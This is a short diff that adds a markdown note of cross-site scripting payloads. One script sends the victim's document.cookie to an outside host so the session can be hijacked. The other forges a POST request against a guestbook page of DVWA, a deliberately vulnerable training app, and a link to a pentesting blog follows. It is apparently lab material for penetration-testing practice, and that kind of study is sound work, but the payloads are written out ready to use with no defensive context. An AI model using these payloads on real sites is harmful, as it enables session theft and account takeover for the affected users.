@@ -1,0 +1,19 @@
+Hijacking User Session or Cookie
+```
+<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
+```
+
+
+Forging a HTTP POST request to an application
+```
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
+	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
+</script>
+```
+
+
+Find more her and detail here:
+https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
